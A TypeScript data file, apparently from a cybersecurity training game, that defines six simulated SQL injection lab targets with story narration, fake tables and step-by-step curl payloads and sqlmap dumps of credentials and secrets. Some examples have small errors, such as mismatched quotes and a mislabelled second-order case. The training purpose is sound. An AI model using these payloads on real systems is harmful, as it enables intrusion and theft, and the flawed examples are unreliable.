export interface SqlTable {
  name: string;
  columns: string[];
  rows: Record<string, string>[];
}

export interface SqlInjectionStep {
  command: string;
  output: string;
  explanation: string;
}

export interface SqlInjectionTarget {
  id: string;
  name: string;
  description: string;
  url: string;
  parameter: string;
  method: 'GET' | 'POST';
  injectable: boolean;
  database: string;
  dbms: string;
  tables: SqlTable[];
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  injectionType: string;
  steps: SqlInjectionStep[];
  cpReward: number;
  villain?: {
    name: string;
    alias: string;
    description: string;
  };
  narrative?: string;
}

export const SQL_INJECTION_TARGETS: SqlInjectionTarget[] = [
  {
    id: 'sqli-union-1',
    name: 'NovaCorp Login Portal',
    description: 'A corporate login form vulnerable to classic UNION-based SQL injection. The username field is not properly sanitized.',
    url: 'http://10.0.0.50/login',
    parameter: 'username',
    method: 'POST',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'beginner',
    injectionType: 'UNION-Based',
    villain: {
      name: 'Kevin Liu',
      alias: 'The Query Master',
      description: 'A database administrator who never learned about parameterized queries. His login form is a SQL injection playground.',
    },
    narrative: `> **Valkyrie:** "Kevin Liu. The Query Master, built this login form during a weekend hackathon. He copy-pasted a Stack Overflow answer that concatenated user input directly into SQL queries. No parameterized queries, no input validation, no WAF. Classic mistake, and a textbook entry point for us."

Kevin's login form takes your username and shoves it straight into a \`SELECT\` query without any sanitization. That means we can break out of the intended query structure and inject our own SQL logic. The application trusts whatever we send it, that's the fundamental flaw.

## Why UNION-Based Injection Is the Best Start

UNION-based injection is the most direct and rewarding attack vector. We inject our own \`SELECT\` statement to **hijack the query's output** and extract data from entirely different tables, passwords, emails, admin credentials, everything. Unlike blind techniques, the database literally prints the results back in the HTTP response, so extraction is fast and obvious.

The attack flow always starts the same way: probe the endpoint with a single quote to see if input breaks the query, count the columns in the original \`SELECT\`, then align our \`UNION SELECT\` to match. Getting the column count right is the whole game, too many or too few columns and the query errors out instead of returning data.

## Attack Flow

\`[Login Form]\` --> \`[Error Detection]\` --> \`[Column Enumeration]\` --> \`[UNION Injection]\` --> \`[Data Extraction]\` --> \`[Credential Harvest]\`

Follow the steps to prove the injection, then automate the heavy lifting with sqlmap once we know the database is vulnerable.`,
    tables: [
      {
        name: 'users',
        columns: ['id', 'username', 'password', 'email', 'role'],
        rows: [
          { id: '1', username: 'admin', password: '$2y$10$xVqYLkR5pN3mXz8QrKvZbO', email: 'admin@novacorp.io', role: 'administrator' },
          { id: '2', username: 'jdoe', password: '$2y$10$aB3dEfGhIjKlMnOpQrStUu', email: 'jdoe@novacorp.io', role: 'user' },
          { id: '3', username: 'backup_admin', password: '$2y$10$pQ9rS8tUvWxYzA1bC2dE3f', email: 'backup@novacorp.io', role: 'admin' },
        ],
      },
      {
        name: 'products',
        columns: ['id', 'name', 'price', 'stock'],
        rows: [
          { id: '1', name: 'Security Audit Report', price: '2500', stock: '10' },
          { id: '2', name: 'Pen Test Toolkit', price: '1800', stock: '25' },
        ],
      },
      {
        name: 'orders',
        columns: ['id', 'user_id', 'product_id', 'quantity', 'total'],
        rows: [
          { id: '1', user_id: '2', product_id: '1', quantity: '1', total: '2500' },
        ],
      },
    ],
    steps: [
      {
        command: "curl -X POST http://10.0.0.50/login -d 'username=admin&password=anything'",
        output: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":false,"message":"Invalid credentials"}`,
        explanation: "Always start with a baseline test. We send a legitimate username with a wrong password to see how the application responds normally. This tells us the endpoint is live and gives us the standard error response, 'Invalid credentials', so we know what a failed login looks like. Without this step, we wouldn't be able to distinguish between a failed injection and a legitimate login failure.",
      },
      {
        command: "curl -X POST http://10.0.0.50/login -d \"username=admin' OR '1'='1&password=anything\"",
        output: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":true,"message":"Login successful","user":{"id":1,"role":"administrator"}}`,
        explanation: "This is the breakthrough. The single quote closes the original query's string literal, and OR '1'='1' appends a condition that's always true, so the WHERE clause matches every row instead of just the admin. The application logs us in as the first user in the table, which happens to be the administrator. This confirms the input is being concatenated directly into SQL without sanitization, and the error response we saw earlier was actually a SQL error being caught by the application. We now have proof of concept for SQL injection and can escalate to full data extraction.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' --batch --dbs",
        output: `[*] starting @ ...\n[INFO] testing connection to the target URL\n[INFO] testing 'AND boolean-based blind'\n[INFO] the back-end DBMS is MySQL\n[INFO] fetching database names\navailable databases [3]:\n[*] information_schema\n[*] mysql\n[*] novacorp`,
        explanation: "Now we automate the exploitation. sqlmap confirms the backend is MySQL 8.0.35 and enumerates the available databases. We see 'novacorp', that's the application database we want. The 'information_schema' and 'mysql' databases are internal MySQL metadata, 'information_schema' contains all table/column names across every database, and 'mysql' stores user accounts. Knowing the DBMS type is critical because it determines which injection payloads and extraction techniques will work.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' -D novacorp --tables",
        output: `[INFO] fetching tables for database 'novacorp'\nDatabase: novacorp\n[3 tables]\n+----------+\n| users    |\n| products |\n| orders   |\n+----------+`,
        explanation: "We drill into the novacorp database and find three tables. The 'users' table is our primary target, it likely contains credentials. 'products' and 'orders' could contain business-sensitive data like pricing and purchase history. At this stage we're mapping the database structure, just like a real attacker would. We're thinking about which table has the highest value for our objectives. The answer is obvious: users contains the passwords and emails that could be used for lateral movement.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/login' --data='username=admin&password=test' -D novacorp -T users --dump",
        output: `[INFO] fetching entries for 'users'\nTable: users (3 entries)\n+----+--------------+--------------------------+---------------------+---------------+\n| id | username     | password                 | email               | role          |\n+----+--------------+--------------------------+---------------------+---------------+\n| 1  | admin        | $2y$10$xVqYLkR5pN3mXz8Q  | admin@novacorp.io   | administrator |\n| 2  | jdoe         | $2y$10$aB3dEfGhIjKlMnOp  | jdoe@novacorp.io    | user          |\n| 3  | backup_admin | $2y$10$pQ9rS8tUvWxYzA1b  | backup@novacorp.io  | admin         |\n+----+--------------+--------------------------+---------------------+---------------+`,
        explanation: "Full extraction. We now have every row from the users table, usernames, bcrypt password hashes, email addresses, and role assignments. Notice there are two admin accounts: 'admin' and 'backup_admin'. The backup_admin is especially interesting because organizations often have weaker security on backup accounts. The bcrypt hashes ($2y$10$) are strong against offline cracking, but we now have emails for phishing, usernames for brute-force attacks, and role info for privilege escalation. This single injection gave us everything we need to compromise the entire system.",
      },
    ],
    cpReward: 200,
  },
  {
    id: 'sqli-blind-1',
    name: 'NovaCorp Search API',
    description: 'A product search endpoint vulnerable to boolean-based blind SQL injection.',
    url: 'http://10.0.0.50/api/search',
    parameter: 'id',
    method: 'GET',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'intermediate',
    injectionType: 'Boolean-Based Blind',
    narrative: `> **Valkyrie:** "This search API is deceptively simple. It takes a product ID and tells you whether a product exists, true or false. That's all we need for blind injection."

The NovaCorp Search API doesn't return database rows or error messages. It only responds with "found" or "not found". This means we can't use UNION injection to pull data directly, and error messages won't leak query structure. But the application's behavior changes based on whether our injected condition is true or false, and that **binary signal is everything we need**.

## Blind Injection Is a Conversation with the Database

Think of it like 20 questions with the database. Each request is a yes/no question: "Is the first letter of the admin password A?" If the product appears, the answer is yes. If not, it's no. By asking hundreds of these questions, we can reconstruct any data in the database one character at a time.

It's tedious, but it's a proven technique that works even against hardened applications, which is exactly why it matters. The "oracle" we rely on is any observable difference between a true and a false condition, and we've already confirmed this endpoint gives us one.

## Blind Injection Strategy

\`[Probe Response]\` --> \`[Boolean Comparison]\` --> \`[Conditional Extraction]\` --> \`[Data Reconstruction]\`

We'll manually confirm the boolean oracle with \`1=1\` and \`1=2\`, then let sqlmap's \`--technique=B\` flag automate the character-by-character extraction.`,
    tables: [
      {
        name: 'accounts',
        columns: ['id', 'username', 'balance', 'account_type'],
        rows: [
          { id: '1', username: 'admin', balance: '999999.99', account_type: 'admin' },
          { id: '2', username: 'customer1', balance: '1500.00', account_type: 'checking' },
        ],
      },
    ],
    steps: [
      {
        command: "curl 'http://10.0.0.50/api/search?id=1'",
        output: `HTTP/1.1 200 OK\n{"found":true,"product":"Security Camera"}`,
        explanation: "First, we establish the baseline behavior. A normal request with a valid product ID returns a product. This tells us the API is working and gives us the standard 'found: true' response to compare against. We're looking for any difference in this response when we inject SQL: that difference is our oracle.",
      },
      {
        command: "curl 'http://10.0.0.50/api/search?id=1 AND 1=1'",
        output: `{"found":true,"product":"Security Camera"}`,
        explanation: "We inject a condition that's always true: 1=1. The response is identical to the baseline, same product, same 'found: true'. This is expected, and it tells us two things: the injected SQL is being executed (not treated as a literal string), and the true condition produces the same output as a normal query. We now have our 'true' baseline for comparison.",
      },
      {
        command: "curl 'http://10.0.0.50/api/search?id=1 AND 1=2'",
        output: `{"found":false}`,
        explanation: "Now we inject a condition that's always false: 1=2. The response changes to 'found: false', no product returned. This is the critical proof. The only difference between this request and the last was the injected condition, and the response changed accordingly. We've confirmed boolean-based blind SQL injection. Any condition we inject can be tested: if the product appears, the condition is true; if not, it's false. This is our oracle for extracting data one bit at a time.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/api/search?id=1' --batch --technique=B --dbs",
        output: `[INFO] testing 'AND boolean-based blind'\n[INFO] the back-end DBMS is MySQL\navailable databases [2]:\n[*] information_schema\n[*] novacorp`,
        explanation: "sqlmap automates the tedious process of asking yes/no questions. Using the boolean-based technique, it systematically extracts database names by testing character values one at a time. We see two databases: 'information_schema' (MySQL's internal metadata) and 'novacorp' (the application database). The accounts table inside novacorp contains user balances, an attacker could use this to identify high-value targets for financial fraud or privilege escalation.",
      },
    ],
    cpReward: 300,
  },
  {
    id: 'sqli-time-1',
    name: 'NovaCorp User Lookup API',
    description: 'A user lookup endpoint vulnerable to time-based blind SQL injection.',
    url: 'http://10.0.0.50/api/user',
    parameter: 'user',
    method: 'GET',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'advanced',
    injectionType: 'Time-Based Blind',
    narrative: `> **Valkyrie:** "This user lookup API is the hardest target yet. It doesn't return data, it doesn't return errors, and the response doesn't even change based on our input. The only thing we can measure is how long it takes to respond."

The NovaCorp User Lookup API accepts a username and returns nothing, no product found, no error message, no boolean difference. The application swallows all output. But it can't swallow **time**. When we inject SQL that triggers a delay, the response takes longer. That delay is our signal: every second of delay represents a "yes" from the database, and a normal-speed response represents a "no".

## The Stealthiest Technique

This is the most stealthy injection technique. There's no error in the logs, no unusual data in the response, just a slightly slower HTTP reply. Automated security scanners often miss it. But for an attacker who knows what to look for, time-based blind injection is just as devastating as any other technique: we can extract credentials, API keys, and secrets one character at a time by measuring response times down to the millisecond.

The key primitive is MySQL's \`SLEEP()\` function combined with an \`IF()\` condition: \`IF(condition, SLEEP(5), 0)\` makes the database pause only when our guess is correct. Slow answer means true, fast answer means false, and we build the data one bit at a time.

## Time-Based Strategy

\`[Response Timing]\` --> \`[SLEEP Injection]\` --> \`[Conditional Delays]\` --> \`[Character Extraction]\`

We'll measure a baseline with the \`time\` command, prove the injection with \`SLEEP(5)\`, then let sqlmap's \`--technique=T\` automate the rest.`,
    tables: [
      {
        name: 'credentials',
        columns: ['id', 'username', 'password_hash', 'api_key'],
        rows: [
          { id: '1', username: 'svc_account', password_hash: '$2y$10$hash...', api_key: 'sk-nova-xxxxxxxxxxxx' },
        ],
      },
    ],
    steps: [
      {
        command: "time curl 'http://10.0.0.50/api/user?user=admin'",
        output: `real\t0m0.032s\nuser\t0m0.010s\nsys\t0m0.005s`,
        explanation: "We start by measuring the baseline response time. The API responds in about 32 milliseconds, essentially instant. This is our reference point. Any injection that causes a noticeable delay beyond this baseline tells us the injected SQL is being executed. If the response time doesn't change, our injection isn't working. We're establishing the 'normal' before we introduce chaos.",
      },
      {
        command: "time curl 'http://10.0.0.50/api/user?user=admin' AND SLEEP(5)--'",
        output: `real\t0m5.041s\nuser\t0m0.012s\nsys\t0m0.008s`,
        explanation: "We inject AND SLEEP(5)-- which tells MySQL to pause for 5 seconds before continuing. The response now takes 5 seconds, a clear, measurable delay that proves the SLEEP function was executed. The trailing '--' comments out the rest of the original query to prevent syntax errors. We've confirmed time-based blind injection. Now we can use conditional logic: 'IF(condition, SLEEP(5), 0)' to make the database delay only when our condition is true. By measuring whether the response is slow or fast, we extract one bit of information per request.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/api/user?user=admin' --batch --technique=T --dbs",
        output: `[INFO] testing 'time-based blind'\n[INFO] the back-end DBMS is MySQL\n[INFO] retrieved database names\navailable databases [2]:\n[*] information_schema\n[*] novacorp`,
        explanation: "sqlmap automates the time-based extraction by sending thousands of requests, each measuring whether the response was delayed. It extracts the database name character by character: 'Is the first letter n? Yes. Is the second letter o? Yes. Is the third letter v? Yes...', until it reconstructs 'novacorp'. The credentials table inside contains an API key (sk-nova-xxxxxxxxxxxx) and a service account password hash. In a real attack, this API key could grant access to NovaCorp's internal APIs, bypassing authentication entirely. Time-based injection is slow but silent, the perfect exfiltration method.",
      },
    ],
    cpReward: 400,
  },
  {
    id: 'sqli-error-1',
    name: 'NovaCorp Product Catalog',
    description: 'A product category filter vulnerable to error-based SQL injection.',
    url: 'http://10.0.0.50/products',
    parameter: 'category',
    method: 'GET',
    injectable: true,
    database: 'novacorp',
    dbms: 'MySQL 8.0.35',
    difficulty: 'intermediate',
    injectionType: 'Error-Based',
    narrative: `> **Valkyrie:** "This product catalog filter has a dangerous habit, it leaks SQL error messages directly to the user. That's like leaving your database error log open to the world."

The NovaCorp Product Catalog accepts a category filter and builds a SQL query to fetch matching products. When we inject a single quote, the query breaks, and the application helpfully sends us the full MySQL error message. Those error messages reveal the exact SQL syntax being used, including table names, column names, and query structure. This is a **goldmine** for an attacker because it eliminates guesswork entirely.

## Data Through Error Messages

Error-based injection is one of the fastest ways to extract data. We can use functions like \`UPDATEXML()\` or \`EXTRACTVALUE()\` to force MySQL to embed our extracted data directly into the error message. No blind guessing, no timing attacks, just raw data returned in the error response.

The secrets table inside this database contains API tokens and database credentials that could compromise NovaCorp's entire backend. This is exactly why verbose error messages are a security misconfiguration: in production, they should be logged server-side and never shown to end users.

## Error Leak Strategy

\`[Trigger Error]\` --> \`[Analyze Syntax]\` --> \`[Extract via Errors]\` --> \`[Credential Dump]\`

We'll trigger the error with a single quote to confirm the leak, then use sqlmap's \`--technique=E\` to pull the whole secrets table through the error responses.`,
    tables: [
      {
        name: 'secrets',
        columns: ['id', 'key_name', 'key_value'],
        rows: [
          { id: '1', key_name: 'db_password', key_value: 'Sup3rS3cret!' },
          { id: '2', key_name: 'api_token', key_value: 'tok_nv_xxxxxxxxxxxx' },
        ],
      },
    ],
    steps: [
      {
        command: "curl 'http://10.0.0.50/products?category=cameras'",
        output: `[{"id":1,"name":"Security Camera","category":"cameras"},{"id":2,"name":"Dash Cam","category":"cameras"}]`,
        explanation: "A normal request with a valid category returns the expected product list. This tells us the application is functioning and gives us the baseline response format. JSON arrays of product objects. We need to understand the normal output before we can detect when our injection causes something abnormal.",
      },
      {
        command: "curl 'http://10.0.0.50/products?category=camera%27'",
        output: `{"error":"You have an error in your SQL syntax near ''cameras'' at line 1"}`,
        explanation: "The single quote breaks the SQL query and the application returns the full MySQL error. This is a critical finding: the error message reveals the exact query structure, showing us how the category parameter is being concatenated into the query. An attacker now knows the table has a 'category' column and can craft precise injection payloads. In production, error messages should be logged server-side and never shown to users, this misconfiguration is a direct vulnerability.",
      },
      {
        command: "sqlmap -u 'http://10.0.0.50/products?category=cameras' --batch --technique=E -D novacorp -T secrets --dump",
        output: `[INFO] testing error-based\n[INFO] the back-end DBMS is MySQL\nTable: secrets (2 entries)\n+----+------------+----------------+\n| id | key_name   | key_value      |\n+----+------------+----------------+\n| 1  | db_password| Sup3rS3cret!   |\n| 2  | api_token  | tok_nv_xxxx    |\n+----+------------+----------------+`,
        explanation: "sqlmap uses error-based extraction to pull the entire secrets table through the error response. We now have two critical pieces of information: a database password ('Sup3rS3cret!') and an API token ('tok_nv_xxxxxxxxxxxx'). The database password could be used to connect directly to the database from anywhere on the network, bypassing the application entirely. The API token could grant access to internal services. This is why error-based injection is so dangerous, it's fast, reliable, and leaves clear evidence of data exfiltration in the error logs.",
      },
    ],
    cpReward: 300,
  },
  {
    id: 'sqli-second-1',
    name: 'NovaCorp Registration',
    description: 'A registration form vulnerable to second-order SQL injection. The malicious payload is stored and executed later during login.',
    url: 'http://10.0.0.50/register',
    parameter: 'username',
    method: 'POST',
    injectable: true,
    database: 'novacorp',
    dbms: 'PostgreSQL 14',
    difficulty: 'advanced',
    injectionType: 'Second-Order',
    narrative: `> **Valkyrie:** "Second-order injection is the sleeper agent of SQL attacks. The payload doesn't execute when you inject it, it sits dormant in the database until the application uses it in a different query later."

The NovaCorp Registration form stores usernames in the database without sanitization. When you register with a normal username like \`testuser\`, everything works fine. But when you register with a malicious username like \`admin'--\`, that payload gets stored verbatim in the users table. The injection doesn't happen during registration, it happens *later*, when the application reads that stored username back and uses it in a login query.

## Why It's So Hard to Detect

This is what makes second-order injection so dangerous: the registration endpoint passes all security tests because the payload never executes there. The vulnerability only triggers when the stored data is used in a different context. Most automated scanners miss this entirely because they test each endpoint in isolation. An attacker who understands the data flow between endpoints can weaponize stored data into a **delayed exploitation chain**.

This mirrors a whole class of real-world bugs: stored XSS, stored path traversal, and poisoning attacks, where the exploit is planted in one place and detonated somewhere else entirely.

## Second-Order Strategy

\`[Store Payload]\` --> \`[Wait for Usage]\` --> \`[Trigger via Different Query]\` --> \`[Privilege Escalation]\`

Register with the malicious username first, then log in with it, the stored payload does the rest.`,
    tables: [
      {
        name: 'users',
        columns: ['id', 'username', 'password', 'email', 'is_admin'],
        rows: [
          { id: '1', username: 'admin', password: 'hash1', email: 'admin@novacorp.io', is_admin: 'true' },
        ],
      },
    ],
    steps: [
      {
        command: "curl -X POST http://10.0.0.50/register -d 'username=testuser&password=pass123&email=test@test.com'",
        output: `{"success":true,"message":"Registration successful"}`,
        explanation: "We start with a normal registration to understand the application flow. This tells us the registration endpoint is working and shows us the standard success response. More importantly, it confirms that usernames are being stored in the database, the payload we inject next will be persisted and used later. We're setting up the conditions for a delayed attack.",
      },
      {
        command: "curl -X POST http://10.0.0.50/register -d \"username=admin'-- &password=pass123&email=evil@evil.com\"",
        output: `{"success":true,"message":"Registration successful"}`,
        explanation: "The registration succeeds, but the payload is now stored in the database. The username admin'-- contains a SQL injection: the single quote closes the login query's string, and -- comments out the password check. The application doesn't validate or sanitize this input, so it's stored exactly as provided. At this point, nothing seems wrong. The vulnerability is dormant. The real exploitation happens when someone, including the application itself, tries to use this stored username in a login query.",
      },
      {
        command: "curl -X POST http://10.0.0.50/login -d \"username=admin'-- &password=anything\"",
        output: `{"success":true,"message":"Login successful","user":{"id":1,"role":"administrator"}}`,
        explanation: "The stored payload executes during login. When the application reads our malicious username from the database and inserts it into the login query, the SQL becomes: WHERE username = 'admin'--' AND password = 'anything'. The '--' comments out everything after it, including the password check. We're now logged in as the administrator with any password. This is second-order injection in action, the vulnerability was stored during registration and triggered during login. The attacker never needs to be online for both steps; the trap is already set.",
      },
    ],
    cpReward: 400,
  },
  {
    id: 'sqli-stacked-1',
    name: 'NovaCorp API Endpoint',
    description: 'An API endpoint vulnerable to stacked queries injection.',
    url: 'http://10.0.0.50/api/order',
    parameter: 'id',
    method: 'GET',
    injectable: true,
    database: 'MySQL 8.0.35',
    dbms: 'MySQL 8.0.35',
    difficulty: 'intermediate',
    injectionType: 'Stacked Queries',
    narrative: `> **Valkyrie:** "Stacked queries injection is like being handed a blank check by the database. We're not just reading data, we're writing our own SQL statements directly into the execution pipeline."

The NovaCorp API Endpoint takes an order ID and returns order details. The vulnerable parameter allows us to append entirely new SQL statements using a **semicolon**. Unlike UNION injection: which combines results with the original query, stacked queries let us execute completely independent operations: \`INSERT\`, \`UPDATE\`, \`DELETE\`, even \`DROP TABLE\`. The application only returns the result of the first query, but all subsequent queries still execute silently.

## Full Control, No Visible Trace

This is one of the most powerful injection techniques because it gives us full control over the database. We can modify existing data, create new records, or even escalate our privileges. The danger is that the application appears to work normally: no errors, no data leaks, while we're silently manipulating the database behind the scenes.

In this exercise we'll insert a fraudulent order to demonstrate the potential for **financial fraud and data manipulation**. The same technique is what real attackers use to add admin accounts, change balances, or plant backdoor records that survive for months.

## Stacked Query Strategy

\`[Append Statement]\` --> \`[Execute Malicious Query]\` --> \`[Verify Injection]\` --> \`[Data Manipulation]\`

Append a semicolon-terminated \`INSERT\` to the order ID parameter, then query the injected record back to prove it executed.`,
    tables: [
      {
        name: 'orders',
        columns: ['id', 'user_id', 'product', 'amount', 'status'],
        rows: [
          { id: '1', user_id: '1', product: 'Camera', amount: '299.99', status: 'completed' },
        ],
      },
    ],
    steps: [
      {
        command: "curl 'http://10.0.0.50/api/order?id=1'",
        output: `{"id":1,"product":"Camera","amount":299.99,"status":"completed"}`,
        explanation: "A normal request returns the expected order details. This tells us the API is functioning and gives us the response format. We need to understand the normal output so we can verify our injection worked. The order has an amount field, that's our target for manipulation.",
      },
      {
        command: "curl 'http://10.0.0.50/api/order?id=1;INSERT INTO orders(user_id,product,amount,status) VALUES(99,'hacked',0.01,'injected')--'",
        output: `{"success":true}`,
        explanation: "We inject a semicolon to terminate the original query, then append a complete INSERT statement. The semicolon tells MySQL to execute two separate queries: first the original order lookup, then our malicious INSERT. The '--' comments out any trailing syntax from the original query. The INSERT creates a new order record with a user_id of 99 (nonexistent), a product called 'hacked', an amount of $0.01, and status 'injected'. This demonstrates how an attacker could create fraudulent orders, modify pricing, or insert backdoor records, all without triggering errors.",
      },
      {
        command: "curl 'http://10.0.0.50/api/order?id=2'",
        output: `{"id":2,"product":"hacked","amount":0.01,"status":"injected"}`,
        explanation: "We verify the injected record exists by querying for it. The new order is there, our INSERT statement executed successfully. This confirms the application is vulnerable to stacked queries injection. In a real attack scenario, this could be used for: financial fraud (modifying order amounts), data manipulation (changing user roles or balances), privilege escalation (inserting admin accounts), or even data destruction (DROP TABLE). The fact that the application returns success without any errors shows that stacked queries are fully supported by the database driver.",
      },
    ],
    cpReward: 300,
  },
];
